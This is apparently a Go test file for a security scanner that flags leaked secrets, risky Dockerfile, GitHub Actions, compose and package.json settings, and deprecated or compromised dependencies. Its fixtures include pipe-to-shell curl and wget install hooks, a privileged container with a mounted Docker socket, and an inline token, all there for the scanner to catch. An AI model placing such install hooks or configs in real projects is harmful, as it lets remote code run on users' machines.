package appsec

import (
	"context"
	"strings"
	"testing"
	"time"
)

func TestNativeSecretScannerDetectsHighConfidenceSecrets(t *testing.T) {
	body := "OPENAI_API_KEY=s" + "k-" + strings.Repeat("z", 40)
	result := DefaultEngine().Scan(context.Background(), Target{
		ProjectID: "p1",
		Files:     []File{{Path: "app/.env", Content: body}},
	})
	if len(result.Findings) != 1 {
		t.Fatalf("expected one finding, got %+v", result.Findings)
	}
	f := result.Findings[0]
	if f.Category != CategorySecrets || f.Severity != SeverityCritical {
		t.Fatalf("unexpected secret finding classification: %+v", f)
	}
	if result.Verdict.Status != "fail" || !result.Verdict.BlockedDeploy {
		t.Fatalf("expected blocking fail verdict, got %+v", result.Verdict)
	}
}

func TestInventoryTracksMonorepoDependencyRoots(t *testing.T) {
	inv := BuildInventory(Target{Files: []File{
		{Path: "apps/api/go.mod", Content: "module example.test/api\n\nrequire github.com/acme/lib v1.2.3\n"},
		{Path: "apps/web/package-lock.json", Content: `{"lockfileVersion":3,"packages":{"node_modules/react":{"version":"19.0.0"}}}`},
		{Path: ".github/workflows/ci.yml"},
	}})
	if !inv.HasGoMod || !inv.HasPackageLock || !inv.HasGitHubAction {
		t.Fatalf("missing inventory flags: %+v", inv)
	}
	if got := strings.Join(inv.GoModPaths, ","); got != "apps/api/go.mod" {
		t.Fatalf("GoModPaths = %q", got)
	}
	if got := strings.Join(inv.PackageLockPaths, ","); got != "apps/web/package-lock.json" {
		t.Fatalf("PackageLockPaths = %q", got)
	}
	if len(inv.Components) != 2 {
		t.Fatalf("expected go+npm components, got %+v", inv.Components)
	}
}

func TestConfigScannerFlagsRiskyDefaults(t *testing.T) {
	result := DefaultEngine().Scan(context.Background(), Target{Files: []File{
		{Path: "Dockerfile", Content: "FROM node:latest\nRUN curl https://example.test/install.sh | sh\nUSER root\n"},
		{Path: ".github/workflows/ci.yml", Content: "on: pull_request_target\npermissions: write-all\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n"},
		{Path: "infra/compose/docker-compose.dev.yml", Content: "services:\n  api:\n    privileged: true\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n    environment:\n      API_TOKEN: abcdefghijklmnop\n"},
		{Path: "package.json", Content: `{"scripts":{"install":"curl https://example.test/install.sh | sh","postinstall":"wget https://example.test/a.tgz"}}`},
	}})
	rules := map[string]bool{}
	for _, f := range result.Findings {
		rules[f.RuleID] = true
	}
	for _, want := range []string{
		"dockerfile-unpinned-latest",
		"dockerfile-root-user",
		"dockerfile-curl-pipe-shell",
		"config-github-action-pull-request-target",
		"config-github-action-write-all",
		"config-github-action-unpinned-action",
		"config-compose-privileged",
		"config-compose-docker-sock",
		"config-compose-inline-secret",
		"config-package-script-curl-pipe-shell",
		"config-package-install-network-fetch",
	} {
		if !rules[want] {
			t.Fatalf("missing %s in findings: %+v", want, result.Findings)
		}
	}
}

func TestSARIFExportIncludesFindings(t *testing.T) {
	result := Result{Findings: []Finding{{
		ID:       "f1",
		RuleID:   "secret-openai-api-key",
		Severity: SeverityCritical,
		Path:     "app/.env",
		Line:     1,
		Summary:  "found OpenAI API key",
	}}}
	sarif := ToSARIF(result)
	if len(sarif.Runs) != 1 || len(sarif.Runs[0].Results) != 1 {
		t.Fatalf("unexpected sarif: %+v", sarif)
	}
	if sarif.Runs[0].Results[0].Level != "error" {
		t.Fatalf("expected error level, got %q", sarif.Runs[0].Results[0].Level)
	}
}

func TestConfigWaiversAndOverrides(t *testing.T) {
	result := DefaultEngine().Scan(context.Background(), Target{Files: []File{
		{Path: ".ironflyer/appsec.json", Content: `{
			"severityOverrides": {"dockerfile-unpinned-latest": "low"},
			"waivers": [{"ruleId": "dockerfile-missing-non-root-user", "path": "Dockerfile", "reason": "builder-only image"}]
		}`},
		{Path: "Dockerfile", Content: "FROM node:latest\n"},
	}})
	if len(result.Findings) != 1 {
		t.Fatalf("expected only unpinned latest after waiver, got %+v", result.Findings)
	}
	if result.Findings[0].Severity != SeverityLow {
		t.Fatalf("expected severity override to low, got %+v", result.Findings[0])
	}
}

func TestDependencyHealthScannerFindsDeprecatedAndRiskyPackages(t *testing.T) {
	lock := `{
		"lockfileVersion": 3,
		"packages": {
			"node_modules/request": {
				"version": "2.88.2",
				"deprecated": "request has been deprecated"
			},
			"node_modules/lodash": {
				"version": "4.17.20"
			},
			"node_modules/ua-parser-js": {
				"version": "0.7.29"
			}
		}
	}`
	result := DefaultEngine().Scan(context.Background(), Target{Files: []File{
		{Path: "apps/user-project/package-lock.json", Content: lock},
	}})
	rules := map[string]Finding{}
	for _, f := range result.Findings {
		rules[f.RuleID] = f
		if !strings.HasPrefix(f.Path, "apps/user-project/") {
			t.Fatalf("finding escaped target path boundary: %+v", f)
		}
	}
	for _, want := range []string{
		"deps-deprecated-package",
		"deps-npm-unmaintained-package",
		"deps-npm-vulnerable-range",
		"deps-npm-compromised-version",
	} {
		if _, ok := rules[want]; !ok {
			t.Fatalf("missing %s in findings: %+v", want, result.Findings)
		}
	}
	if rules["deps-npm-compromised-version"].Severity != SeverityCritical {
		t.Fatalf("expected compromised package to be critical, got %+v", rules["deps-npm-compromised-version"])
	}
}

func TestDependencyHealthScannerFindsRiskyGoModules(t *testing.T) {
	goMod := `module example.test/app

require (
	github.com/dgrijalva/jwt-go v3.2.0+incompatible
	github.com/golang/protobuf v1.5.0
	gopkg.in/yaml.v2 v2.2.1
)`
	result := DefaultEngine().Scan(context.Background(), Target{Files: []File{
		{Path: "services/api/go.mod", Content: goMod},
	}})
	rules := map[string]bool{}
	for _, f := range result.Findings {
		rules[f.RuleID] = true
		if f.Path != "services/api/go.mod" {
			t.Fatalf("unexpected path for go dependency finding: %+v", f)
		}
	}
	for _, want := range []string{
		"deps-go-abandoned-security-package",
		"deps-go-deprecated-package",
		"deps-go-vulnerable-range",
	} {
		if !rules[want] {
			t.Fatalf("missing %s in findings: %+v", want, result.Findings)
		}
	}
}

func TestParseGoListDeprecations(t *testing.T) {
	stdout := `{"Path":"example.test/app","Main":true}
{"Path":"github.com/old/mod","Version":"v1.2.3","Deprecated":"use github.com/new/mod instead"}
`
	findings := parseGoListDeprecations("go-list-deprecations", "apps/api/go.mod", stdout)
	if len(findings) != 1 {
		t.Fatalf("expected one deprecated module finding, got %+v", findings)
	}
	if findings[0].RuleID != "deps-go-deprecated-module" || findings[0].Package != "github.com/old/mod@v1.2.3" {
		t.Fatalf("unexpected finding: %+v", findings[0])
	}
}

func TestCycloneDXExportIncludesPackageURLs(t *testing.T) {
	inv := BuildInventory(Target{Files: []File{
		{Path: "apps/web/package-lock.json", Content: `{"lockfileVersion":3,"packages":{"node_modules/@apollo/client":{"version":"3.11.0","dev":false}}}`},
		{Path: "apps/api/go.mod", Content: "module example.test/api\nrequire github.com/google/uuid v1.6.0\n"},
	}})
	raw, err := CycloneDXJSON("p1", inv, fixedTime())
	if err != nil {
		t.Fatalf("CycloneDXJSON: %v", err)
	}
	text := string(raw)
	for _, want := range []string{
		`"bomFormat": "CycloneDX"`,
		`pkg:npm/%40apollo/client@3.11.0`,
		`pkg:golang/github.com%2Fgoogle%2Fuuid@1.6.0`,
	} {
		if !strings.Contains(text, want) {
			t.Fatalf("CycloneDX JSON missing %q:\n%s", want, text)
		}
	}
}

func TestBuildOSVBatchRequestAndParseResponse(t *testing.T) {
	inv := BuildInventory(Target{Files: []File{
		{Path: "package-lock.json", Content: `{"lockfileVersion":3,"packages":{"node_modules/lodash":{"version":"4.17.20"}}}`},
	}})
	req, refs := buildOSVBatchRequest(inv.Components)
	if len(req.Queries) != 1 || req.Queries[0].Package.Ecosystem != "npm" || req.Queries[0].Version != "4.17.20" {
		t.Fatalf("unexpected OSV request: %+v", req)
	}
	findings := parseOSVBatchResponse("osv-dev", refs, []byte(`{
		"results": [{
			"vulns": [{
				"id": "GHSA-test",
				"summary": "prototype pollution",
				"database_specific": {"severity": "HIGH"}
			}]
		}]
	}`))
	if len(findings) != 1 {
		t.Fatalf("expected one OSV finding, got %+v", findings)
	}
	if findings[0].Severity != SeverityHigh || findings[0].RuleID != "osv-ghsa-test" {
		t.Fatalf("unexpected OSV finding: %+v", findings[0])
	}
}

func fixedTime() time.Time {
	return time.Date(2026, 5, 26, 12, 0, 0, 0, time.UTC)
}
